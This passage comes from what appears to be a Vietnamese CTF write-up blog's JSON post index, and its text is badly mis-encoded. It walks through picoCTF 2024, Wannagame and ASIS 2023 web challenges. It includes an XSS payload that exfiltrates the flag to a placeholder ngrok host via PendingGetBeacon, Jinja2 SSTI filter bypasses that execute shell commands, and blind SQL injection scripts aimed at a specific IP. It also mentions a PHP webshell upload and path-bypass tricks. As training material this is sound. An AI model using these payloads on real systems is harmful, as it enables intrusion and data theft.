sá»‘ query operator Ä‘á»ƒ táº¡o ra cÃ¡c Ä‘iá»u kiá»‡n cá»¥ thá»ƒ Ä‘á»ƒ database tráº£ vá» dá»¯ liá»‡u á»©ng vá»›i Ä‘iá»u kiá»‡n Ä‘Ã³, dá»±a vÃ o Ä‘Ã³ ta cÃ³ thá»ƒ báº¯t nÃ³ tráº£ vá» giÃ¡ trá»‹ mÃ  ta mong muá»‘nVáº­y chÃºng ta cÃ³ thá»ƒ thÃªm má»™t query operator $ne Ä‘á»ƒ tráº£ vá» táº¥t cáº£ giÃ¡ trá»‹ khÃ´ng giá»‘ng vá»›i giÃ¡ trá»‹ ta nháº­p vÃ oDecode token vÃ  cÃ³ Ä‘Æ°á»£c flagFlag: picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_af67328d}WEB EXPLOITATION: TricksterI found a web app that can help process images: PNG images only!Additional details will be available after launching your challenge instance.BÃ i nÃ y cho má»™t trang web Ä‘á»ƒ upload áº£nh png lÃªn, vÃ¬ Ä‘Ã¢y lÃ  má»™t bÃ i blackbox nÃªn mÃ¬nh check /robots.txt xem cÃ³ gÃ¬ hot khÃ´ngCÃ³ 2 Ä‘Æ°á»ng dáº«n  /uploads/ cÃ³ váº» Ä‘Ã¢y lÃ  nÆ¡i sáº½ lÆ°u trá»¯ cÃ¡c file mÃ¬nh upload lÃªn  /instructions.txt ná»™i dung cá»§a nÃ³ tÃ³m táº¯t lÃ  nÃ³ sáº½ cho phÃ©p file upload lÃªn cÃ³ .png trong tÃªn, cÃ³ header cá»§a PNGUpload má»™t vÃ i bá»©c áº£nh thÃ¬ nháº­n ra backend cá»§a web sá»­ dá»¥ng PHP nÃªn mÃ¬nh sáº½ up file PHP Ä‘á»ƒ táº¡o má»™t cÃ¡i webshellCÃ³ Ä‘Æ°á»£c webshell rá»“i thÃ¬ láº¥y flag thÃ´iFlag: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222}WEB EXPLOITATION: elementsInsert Standard Web Challenge Here.BÃ i nÃ y cho má»™t trang web cÃ³ giao diá»‡n nhÆ° sauTrang web nÃ y cÃ³ chá»©c nÄƒng kÃ©o cÃ¡c element vÃ o nhau Ä‘á»ƒ táº¡o ra element má»›i.Sau khi phÃ¢n tÃ­ch qua source code thÃ¬ cÃ³ cÃ¡c Ä‘iá»u Ä‘Ã¡ng chÃº Ã½ sau:  const evaluate = (...items) =&gt; {    const [a, b] = items.sort();    for (const [ingredientA, ingredientB, result] of recipes) {      if (ingredientA === a &amp;&amp; ingredientB == b) {        if (result === 'XSS' &amp;&amp; state.xss) {          eval(state.xss);        }        return result;      }    }\t  return null;  }Äoáº¡n code nÃ y náº¿u chÃºng ta táº¡o ra má»™t element cÃ³ tÃªn lÃ  XSS vÃ  cÃ³ giÃ¡ trá»‹ state.xss  thÃ¬ cÃ³ thá»ƒ thá»±c hiá»‡n lá»‡nh eval()try {\tstate = JSON.parse(atob(window.location.hash.slice(1)));\tfor (const [a, b] of state.recipe) {\t\tif (!found.has(a) || !found.has(b)) {\t\t\tbreak;\t\t}\t\tconst result = evaluate(a, b);\t\tfound.set(result, elements.get(result));\t}} catch(e) {}Äoáº¡n code nÃ y sáº½ láº¥y object state báº±ng cÃ¡ch decode pháº§n sau dáº¥u thÄƒng (fragment identifier) vÃ  parse nÃ³ sau Ä‘Ã³ láº¥y tá»«ng giÃ¡ trá»‹ trong state.recipe Ä‘á»ƒ craft lÃªn element má»›iconst csp =  [\t\t\"default-src 'none'\",\t\t\"style-src 'unsafe-inline'\",\t\t\"script-src 'unsafe-eval' 'self'\",\t\t\"frame-ancestors 'none'\",\t\t\"worker-src 'none'\",\t\t\"navigate-to 'none'\"]res.setHeader('Content-Security-Policy', csp.join('; '));res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');res.setHeader('X-Frame-Options', 'deny');res.setHeader('X-Content-Type-Options', 'nosniff');Äoáº¡n nÃ y thÃ¬ set láº§n lÆ°á»£t cÃ¡c csp (Content-Security-Policy) Ä‘á»ƒ báº£o máº­t trang web giáº£i thÃ­ch sÆ¡ quaDefault-src: none : CÃ¡c nguá»“n Ä‘Æ°á»£c máº·t Ä‘á»‹nh lÃ  khÃ´ng cho phÃ©p tá»« báº¥t ká»³ nguá»“n nÃ oStyle-src : unsafe-inline : Cho phÃ©p chÃ¨n má»™t inline block styleScript-src : unsafe-eval self : Cho phÃ©p dÃ¹ng lá»‡nh eval vÃ  dÃ¹ng cÃ¡c script Ä‘Æ°á»£c táº£i tá»« cÃ¹ng má»™t nguá»“nframe-ancestors none : KhÃ´ng cho phÃ©p cÃ¡c trang web khÃ¡c nhÃºng nÃ³ vÃ o má»™t frame hay iframe nÃ o Ä‘Ã³worker-src 'none' : KhÃ´ng cho phÃ©p sá»­ dá»¥ng Worker Ä‘á»ƒ thá»±c thi cÃ¡c lá»‡nh javascript Ä‘á»™c láº­p cháº¡y song songnavigate-to 'none' : KhÃ´ng cho phÃ©p Ä‘iá»u hÆ°á»›ng trang webstate = {...state, flag }await mkdir(join(userDataDir, 'Default'));await writeFile(join(userDataDir, 'Default', 'Preferences'), JSON.stringify({\t\tnet: {\t\t\tnetwork_prediction_options: 2\t\t}}));const proc = spawn(\t\t'/usr/bin/chromium-browser-unstable', [\t\t`--user-data-dir=${userDataDir}`,\t\t'--profile-directory=Default',\t\t'--no-sandbox',\t\t'--js-flags=--noexpose_wasm,--jitless',\t\t'--disable-gpu',\t\t'--no-first-run',\t\t'--enable-experimental-web-platform-features',\t\t`http://127.0.0.1:8080/#${Buffer.from(JSON.stringify(state)).toString('base64')}`\t],\t{ detached: true })VÃ  cuá»‘i cÃ¹ng lÃ  Ä‘oáº¡n nÃ y, khi chÃºng ta Ä‘áº¿n Ä‘Æ°á»ng dáº«n /remoteCraft vÃ  cho nÃ³ 1 parameter recipe thÃ¬ chÃºng ta cÃ³ trigger server Ä‘i Ä‘áº¿n website nÃ y vá»›i pháº§n fragment identifier lÃ  giÃ¡ trá»‹ cá»§a object stateCÃ³ má»™t vÃ i setting Ä‘Ã£ Ä‘Æ°á»£c thÃªm vÃ o, Ä‘oáº¡n setting nÃ y sáº½ ngÄƒn khÃ´ng cho táº£i trÆ°á»›c báº¥t ká»³ tÃ i nguyÃªn tá»« máº¡ng nÃ onet:{  network_prediction_options: 2}Sau khi cÃ³ cÃ¡c dá»¯ kiá»‡n, chÃºng ta cÃ³ thá»ƒ nghá»‰ Ä‘áº¿n craft recipe sao cho tráº£ vá» káº¿t quáº£ lÃ  XSS vÃ  chÃ¨n lá»‡nh javascript vÃ o Ä‘á»ƒ eval gá»­i flag vá» cho chÃºng ta, mÃ¬nh Ä‘Ã£ thá»­ ráº¥t nhiá»u cÃ¡ch vÃ  tÃ¬m Ä‘Æ°á»£c má»™t cÃ¡ch Ä‘Ã³ lÃ  sourceMappingURL nhÆ°ng Ä‘á»ƒ dÃ¹ng Ä‘Æ°á»£c cÃ¡i nÃ y thÃ¬ pháº£i má»Ÿ Ä‘Æ°á»£c Devtools cá»§a chrome nhÆ°ng cÃ¡ch nÃ y hoÃ n toÃ n khÃ´ng Ä‘Æ°á»£c vÃ¬ dÃ­nh báº£o máº­t cá»§a chromeSau Ä‘Ã³ mÃ¬nh thá»­ ráº¥t nhiá»u lá»‡nh vÃ o nhÆ°ng khÃ´ng cÃ³ lá»‡nh nÃ o cÃ³ thá»ƒ vÆ°á»£t qua Ä‘Æ°á»£c csp vÃ  cÃ¡c setting cá»§a chrome trÃªn, Ä‘áº¿n lÃºc nÃ y thÃ¬ mÃ¬nh Ä‘Ã£ bÃ³ tay vÃ  bá» cuá»™cSau giáº£i khi mÃ¬nh Ä‘á»c Ä‘Æ°á»£c writeup cá»§a satoki thÃ¬ mÃ¬nh má»›i biáº¿t Ä‘Æ°á»£c ráº±ng chÃºng ta cÃ³ thá»ƒ dÃ¹ng PendingGetBeacon Ä‘Ã¢y lÃ  má»™t chá»©c nÄƒng thá»­ nghiá»‡m cá»§a chrome (sau nÃ y Ä‘Æ°á»£c thay tháº¿ báº±ng fetchLater á»Ÿ nhá»¯ng phiÃªn báº£n sau nÃ y)Giáº£i thÃ­ch vá» chá»©c nÄƒng cá»§a PendingGetBeacon nÃ³ sáº½ gá»­i request Ä‘áº¿n má»™t HTTPS server sau khi browser bá»‹ huá»· hoáº·c Ä‘Ã£ Ä‘Æ°á»£c lÆ°u vÃ o cache vÃ  khÃ´ng Ä‘Æ°á»£c táº£i láº¡i sau má»™t khoáº£ng thá»i gian. NhÆ°ng Ä‘iá»u Ä‘áº·c biá»‡t nháº¥t, nÃ³ khÃ´ng bá»‹ dÃ­nh giá»›i háº¡n cá»§a CSP vÃ  cÃ³ thá»ƒ dÃ¹ng Ä‘á»ƒ gá»­i data trong web ra ngoÃ iTa sáº½ thÃªm má»™t options Ä‘á»ƒ send beacon khi mÃ  trang  bá»‹ huá»·/ khÃ´ng Ä‘Æ°á»£c load sau 1 thá»i gian nháº¥t Ä‘á»‹nh sáº½ gá»­i request lÃªn server báº±ng {timeout:1000}(sau 1s sáº½ gá»­i)LÃºc nÃ y thÃ¬ Ä‘Ã£ biáº¿t Ä‘Æ°á»£c lá»‡nh nÃ o cÃ³ thá»ƒ sá»­ dá»¥ng Ä‘Æ°á»£c thÃ¬ Ä‘oáº¡n nÃ y Ä‘Ã£ dá»… rá»“iPayload: recipe={\"recipe\": [[\"Air\", \"Water\"], [\"Earth\", \"Water\"], [\"Earth\", \"Fire\"], [\"Fire\", \"Mist\"], [\"Magma\", \"Mud\"], [\"Fog\", \"Mud\"], [\"Obsidian\", \"Water\"], [\"Hot Spring\", \"Sludge\"], [\"Fire\", \"Steam Engine\"], [\"Air\", \"Earth\"], [\"Earth\", \"Obsidian\"], [\"Hot Spring\", \"Steam Engine\"], [\"Dust\", \"Heat Engine\"], [\"Computer Chip\", \"Fire\"], [\"Computer Chip\", \"Steam Engine\"], [\"Computer Chip\", \"Electricity\"], [\"Magma\", \"Mist\"], [\"Fire\", \"Sand\"], [\"Artificial Intelligence\", \"Data\"], [\"Computer Chip\", \"Software\"], [\"Air\", \"Rock\"], [\"Glass\", \"Software\"], [\"Encryption\", \"Software\"], [\"Internet\", \"Program\"], [\"Cybersecurity\", \"Vulnerability\"], [\"Exploit\", \"Web Design\"]], \"xss\": \"new PendingGetBeacon('https://NGROKSERVER/xxxx/?yuu=' + window.location.hash.slice(1), {timeout: 1000});\"}Sau khoáº£ng 1s sáº½ nháº­n Ä‘Æ°á»£c má»™t request Ä‘áº¿n server cá»§a taDecode vÃ  láº¥y flagFlag: picoCTF{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a}Fun fact: BÃ i nÃ y sau khi mÃ¬nh háº¿t cá»©u thÃ¬ mÃ¬nh Ä‘Ã£ thá»±c hiá»‡n phÆ°Æ¡ng thá»©c random bullshit go vÃ  bá»‹ ngÆ°á»i anh pro cá»§a mÃ¬nh nháº¯c nhá»Ÿ :\"(( may mÃ  khÃ´ng cÃ³ cÃ¡i payload nÃ o hack mÃ¡y mÃ¬nh, hehe cáº£m Æ¡n anh Ä‘Ã£ nháº¯c nhá»ŸLá»i báº¡t: Sau giáº£i thÃ¬ mÃ¬nh cÅ©ng há»c Ä‘Æ°á»£c thÃªm ráº¥t nhiá»u thá»© vÃ  Ä‘Æ°á»£c cÃ¹ng team chÆ¡i giáº£i nÃ y, mong sau nÃ y team mÃ¬nh Ä‘áº¡t Ä‘Æ°á»£c thá»© háº¡ng cao hÆ¡n. Cáº£m Æ¡n ae (Hidori, Kuro0, fuyosuru, SinsAries)Nguá»“n Writeup: https://github.com/satoki/ctf_writeups/tree/master/picoCTF_2024"
  },
  
  {
    "title": "Wannagame Freshman CTF writeup",
    "url": "/posts/Wannagame-Freshman/",
    "categories": "CTF Writeup",
    "tags": "SQL Injectiom, SSTI",
    "date": "2023-11-11 23:00:00 +0700",
    





    
    "snippet": "WannaWinFreshman-WriteupBÃ i 1 Warmup PHP:  TÃ³m táº¯t Ä‘á» thÃ¬ Ä‘áº¡i khÃ¡i lÃ  Ä‘á» báº£o chÃºng ta pháº£i POST data lÃªn dÆ°á»›i dáº¡ng json cÃ³ key lÃ  page vÃ  sau Ä‘Ã³ chÆ°Æ¡ng trÃ¬nh sáº½ server sáº½ decode ra vÃ  Ä‘á»c file tron...",
    "content": "WannaWinFreshman-WriteupBÃ i 1 Warmup PHP:  TÃ³m táº¯t Ä‘á» thÃ¬ Ä‘áº¡i khÃ¡i lÃ  Ä‘á» báº£o chÃºng ta pháº£i POST data lÃªn dÆ°á»›i dáº¡ng json cÃ³ key lÃ  page vÃ  sau Ä‘Ã³ chÆ°Æ¡ng trÃ¬nh sáº½ server sáº½ decode ra vÃ  Ä‘á»c file trong server      Sau khi phÃ¢n tÃ­ch vÃ  tÃ¬m kiáº¿m trÃªn máº¡ng thÃ¬ mÃ¬nh tÃ¬m Ä‘Æ°á»£c 1 bÃ i viáº¿tLINK        CÆ¡ báº£n lÃ  json_decode nÃ³ sáº½ decode luÃ´n mÃ£ unicode thÃ nh chá»¯ cÃ¡i vÃ¬ váº­y mÃ¬nh chá»‰nh láº¡i cÃ¡i payload cá»§a mÃ¬nh tá»« php://filter/convert.base64-encode/resource=/flagthÃ nh\\u0070hp://filter/convert.base64-encode/resource=/flag    Decode base64 vÃ  ra flag  Flag: W1{w3lc0m3_w3b_w4rrj0rs}    BÃ i 2 Namename:            BÃ i nÃ y cho 1 Ä‘Æ°á»ng link vÃ  khÃ´ng cho thÃªm gÃ¬ khÃ¡c sau khi xem source cá»§a web nÃ y thÃ¬ tháº¥y cÃ³ 1 Ä‘Æ°á»ng dáº«n lÃ  /wannaw1n    Sau khi Ä‘i tá»›i Ä‘Æ°á»ng dáº«n /wannaw1n mÃ¬nh nháº­n ra ngay Ä‘Ã¢y lÃ  SSTI jinja2  Payload : {{().__class__.__base__.__subclasses__()[279]('ls',shell=1,stdout=-1).communicate()}}      VÃ  nÃ³ bá»‹ cháº·n         Sau vÃ i thá»­ nghiá»‡m thÃ¬ cÃ³ váº½ nÃ³ cháº·n dáº¥u . vÃ  [] nÃªn mÃ¬nh chuyá»ƒn qua |attr     Payload má»›i: {{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__\")()|attr(\"__getitem__\")(279)('ls',shell=1,stdout=-1)|attr('communicate')()}}  VÃ  nÃ³ Ä‘Ã£ hoáº¡t Ä‘á»™ng      BÃ¢y giá» sá»­a láº¡i payload tá»« ls sang cat flag.txt    VÃ  nÃ³ váº«n bá»‹ cháº·n cÃ¡i gÃ¬ Ä‘áº¥y nÃªn mÃ¬nh sá»­ dá»¥ng cÃ¡ch nÃ y bypass filter (chá»• nÃ y lÃ  cháº·n dáº¥u . vÃ  chá»¯ f thÃ¬ pháº£i)  {{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__\")()|attr(\"__getitem__\")(279)('cat+*',shell=1,stdout=-1)|attr('communicate')()}}  CÃ¡ch nÃ y sáº½ Ä‘á»c háº¿t táº¥t cáº£ cÃ¡c file trong thÆ° má»¥c hiá»‡n táº¡i vÃ  tÃ¬m Ä‘Æ°á»£c flag  Flag: W1{U_are_master_in_SSTI}    BÃ i 3 Solite:        BÃ i nÃ y mÃ¬nh khÃ¡ tiáº¿c vÃ¬ mÃ¬nh Ä‘á»c khÃ´ng ká»‰ filter nÃªn mÃ¬nh khÃ´ng lÃ m Ä‘Æ°á»£c  TÃ³m táº¯t Ä‘á» thÃ¬ bÃ i nÃ y chá»‰ cho chÃºng ta cÃ¡i page nhÆ° tháº¿ nÃ y (blackbox)  Sau khi Ä‘á»c code vÃ  Ä‘Æ°á»£c nghe 1 sá»‘ gá»£i Ã½ thÃ¬ mÃ¬nh hiá»ƒu Ä‘Æ°á»£c Ä‘Ã¢y lÃ  Blind SQL Injection      NhÃ¬n kÄ© source thÃ¬ cÃ³ 1 lá»— há»•ng cho chÃºng ta khai thÃ¡c lÃ  substr khÃ´ng bá»‹ filter        ÄÃ¢y lÃ  query cá»§a bÃ i    Sau má»™t vÃ i thá»­ nghiá»‡m thÃ¬ mÃ¬nh tÃ¬m Ä‘Æ°á»£c cÃ¡ch Ä‘á»ƒ in ra tÃªn cá»§a báº£ng  Payload: 1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),i,1) is 'a'--  TÃ³m táº¯t :  Payload nÃ y sau khi gá»­i lÃªn server thÃ¬ server sáº½ thá»±c hiá»‡n 1 query nhÆ° sau SELECT * FROM API WHERE id LIKE '%1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--%'  select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%' sáº½ tráº£ vá» tÃªn cá»§a táº¥t cáº£ cÃ¡c báº£ng  substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) sáº½ láº¥y 1 kÃ½ tá»± a báº¯t Ä‘áº§u tá»« vá»‹ trÃ­ i  1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'-- cÃ¡i nÃ y sáº½ so sÃ¡nh kÃ½ tá»± mÃ  substr vá»«a cáº¯t ra náº¿u chÃ­nh xÃ¡c thÃ¬ sáº½ thá»±c hiá»‡n lá»‡nh Ä‘áº±ng trÆ°á»›c lÃ  SELECT * FROM API WHERE id LIKE '%1' vÃ  tráº£ vá» cá»™t id=1 náº¿u sai thÃ¬ nÃ³ khÃ´ng thá»±c hiá»‡n vÃ  cháº³ng tráº£ vá» gÃ¬ cáº£  ÄÃ¢y lÃ  script mÃ¬nh tÃ¬m tÃªn cá»§a báº£ngimport string,requestsfrom urllib.parse import quoteall_characters = string.ascii_letters + string.digits + \"!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}\"url = \"http://45.122.249.68:20020/search?name[]=\"payload=\"1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--\"table_name = \"\"haha = 0for i in range(1,10000):    for ps in all_characters:        payload =\"1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%%'),%d,1) is '%c'--\" %(i,ps)        payload =  quote(payload)        urlx = url + payload        #print(urlx)        r=requests.get(url=urlx)        if \"id\" in r.text:            table_name += ps            print(\"Table names: \",table_name)            haha +=1    if haha &lt; i:        breakprint(\"Success all the names of the tables are:\",table_name)  VÃ  tÃ¬m ra Ä‘Æ°á»£c tÃªn cá»§a cÃ¡c báº£ng lÃ Tables: API,flag_c1abd148_acae_40be_a953_eae333f90da0  BÃ¢y giá» dá»±a vÃ o cÃ¡i trÃªn láº¥y ra flag tá»« báº£ng flag_c1abd148_acae_40be_a953_eae333f90da0 thÃ´i  Script cá»§a mÃ¬nhimport string,requestsfrom urllib.parse import quoteall_characters = string.ascii_letters + string.digits + \"!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}\"url = \"http://45.122.249.68:20020/search?name[]=\"table_name = \"flag_c1abd148_acae_40be_a953_eae333f90da0\"#payload = \"1' and substr((select flag from flag_c1abd148_acae_40be_a953_eae333f90da0),1,1) is 'a'--\"haha = 0flag =\"\"for i in range(1,10000):    for ps in all_characters:        payload =\"1' and substr((select flag from %s),%d,1) is '%c'--\" %(table_name,i,ps)        payload =  quote(payload)        urlx = url + payload        #print(urlx)        r=requests.get(url=urlx)        if \"id\" in r.text:            flag += ps            print(\"Flag is: \",flag)            haha +=1    if haha &lt; i:        breakprint(\"Here is your flag:\",flag)  Flag: W1{I_th1nk_u_r_so_lite^_^}    BÃ i 4 Differences:        Flag ngay á»Ÿ trong file  Flag: W1{SaKur4_s0_b34uTiFuL_RI9ht?????}    BÃ i 5 Free Flag:        Äá»c file pcapng ta tÃ¬m Ä‘Æ°á»£c source vÃ  keyimport base64BANNER = \"\"\" ___       __   ________  ________   ________   ________  ___       __     _____  ________      |\\  \\     |\\  \\|\\   __  \\|\\   ___  \\|\\   ___  \\|\\   __  \\|\\  \\     |\\  \\  / __  \\|\\   ___  \\    \\ \\  \\    \\ \\  \\ \\  \\|\\  \\ \\  \\\\\\ \\  \\ \\  \\\\\\ \\  \\ \\  \\|\\  \\ \\  \\    \\ \\  \\|\\/_|\\  \\ \\  \\\\\\ \\  \\    \\ \\  \\  __\\ \\  \\ \\   __  \\ \\  \\\\\\ \\  \\ \\  \\\\\\ \\  \\ \\   __  \\ \\  \\  __\\ \\  \\|/ \\ \\  \\ \\  \\\\\\ \\  \\    \\ \\  \\|\\__\\_\\  \\ \\  \\ \\  \\ \\  \\\\\\ \\  \\ \\  \\\\\\ \\  \\ \\  \\ \\  \\ \\  \\|\\__\\_\\  \\   \\ \\  \\ \\  \\\\\\ \\  \\    \\ \\____________\\ \\__\\ \\__\\ \\__\\\\\\ \\__\\ \\__\\\\\\ \\__\\ \\__\\ \\__\\ \\____________\\   \\ \\__\\ \\__\\\\\\ \\__\\\\    \\|____________|\\|__|\\|__|\\|__| \\|__|\\|__| \\|__|\\|__|\\|__|\\|____________|    \\|__|\\|__| \\|__|\"\"\"KEY = bytes.fromhex('deadbeef')def encryptSecret(secret):    lst_byte = []    for i in range(len(secret)):        enc_byte = ord(secret[i]) ^ KEY[i % len(KEY)]        lst_byte.append(enc_byte.to_bytes(1, 'big'))        return base64.b64encode(b''.join([_ for _ in lst_byte])).decode()if __name__=='__main__':    print(BANNER)    secret = input(\"&gt; Please give me your secret: \")    print(\"\\n&gt; Here is your encrypted secret:\", encryptSecret(secret)  Decrypt láº¡i ta sáº½ cÃ³ flagimport base64KEY = bytes.fromhex('deadbeef')def decryptSecret(encrypted_secret):    encrypted_bytes = base64.b64decode(encrypted_secret.encode())    decrypted_bytes = [encrypted_bytes[i] ^ KEY[i % len(KEY)] for i in range(len(encrypted_bytes))]    decrypted_text = ''.join([chr(byte) for byte in decrypted_bytes])    return decrypted_textsecret = \"iZzFsKme0oOdndOqgdnxsKmZ0KG/2o+hgdA=\"print(decryptSecret(secret))  Flag: W1{w3llC0mE_tO_w4nNaw1N}  Máº¥y bÃ i cÃ²n láº¡i mÃ¬nh chÆ°a biáº¿t lÃ m do dark quÃ¡"
  },
  
  {
    "title": "Asis CTF 2023 Writeup",
    "url": "/posts/AsisCTF/",
    "categories": "CTF Writeup",
    "tags": "",
    "date": "2023-09-24 23:00:00 +0700",
    





    
    "snippet": "Asis-CTF-2023-WriteupBÃ i 1 hello:  TÃ³m táº¯t Ä‘á» thÃ¬ Ä‘áº¡i khÃ¡i lÃ  Ä‘á» báº£o chÃºng ta pháº£i request má»™t cÃ¡i method get cÃ³ parameter lÃ  x lÃªn Web sao cho khÃ´ng cÃ³ chá»¯ next vÃ  chá»¯ file lÃ  Ä‘Æ°á»£c, nhÆ°ng mÃ  muá»‘n ...",
    "content": "Asis-CTF-2023-WriteupBÃ i 1 hello:  TÃ³m táº¯t Ä‘á» thÃ¬ Ä‘áº¡i khÃ¡i lÃ  Ä‘á» báº£o chÃºng ta pháº£i request má»™t cÃ¡i method get cÃ³ parameter lÃ  x lÃªn Web sao cho khÃ´ng cÃ³ chá»¯ next vÃ  chá»¯ file lÃ  Ä‘Æ°á»£c, nhÆ°ng mÃ  muá»‘n Ä‘á»c Ä‘Æ°á»£c flag thÃ¬ pháº£i Ä‘á»c Ä‘Æ°á»£c file next.txt  Äá»c Ä‘á», Ä‘á» gá»£i Ã½ cho mÃ¬nh Ä‘á»c manpage cá»§a curl  Sau khi Ä‘á»c vÃ  phÃ¢n tÃ­ch manpage mÃ¬nh Ä‘Ã£ nháº­n ra cÃ¡ch lÃ m cá»§a bÃ i nÃ y dá»±a vÃ o chá»©c nÄƒng bÃªn dÆ°á»›i  ÄÃ¢y lÃ  payload cá»§a mÃ¬nh ?x=f[a-i]le:///ne[b-x]t.txt  Khi bypass Ä‘Æ°á»£c Ä‘oáº¡n Ä‘áº§u tiÃªn nÃ³ sáº½ hiá»‡n ra 1 Ä‘Æ°á»ng dáº«n má»›i  Theo Ä‘Æ°á»ng dáº«n, Ä‘i tá»›i Ä‘oáº¡n thá»© 2  Decode Base64 ra Ä‘á»ƒ láº¥y ná»™i dung  Cháº¯c cháº¯n /app/index.js lÃ  source nÃªn mÃ¬nh Ä‘Ã£ Ä‘á»c nÃ³  Decode tiáº¿p thÃ¬ ra source code  Code nÃ y Ä‘áº¡i khÃ¡i lÃ  cÅ©ng nhÆ° cÃ¡i Ä‘áº§u báº¯t mÃ¬nh Ä‘á»c file /next.txt nhÆ°ng láº¡i cáº¥m chá»¯ next  Sau khi phÃ¢n tÃ­ch code nháº­n ra lá»—i á»Ÿ 2 chá»• nÃ y  path.basename(fpath) sáº½ tráº£ láº¡i cÃ¡i tÃªn file vá» cho mÃ¬nh cÃ²n fs.readFileSync(fpath) sáº½ Ä‘á»c file cá»§a fpath  Sau má»™t sá»‘ thá»­ nghiá»‡m thÃ¬ Ä‘Ã¢y lÃ  payload cuá»‘i cÃ¹ng cá»§a mÃ¬nh /next.txt%00/yuu.txt  Decode  Decode  Flag: ASIS{good_job_bun}"
  }
  
]

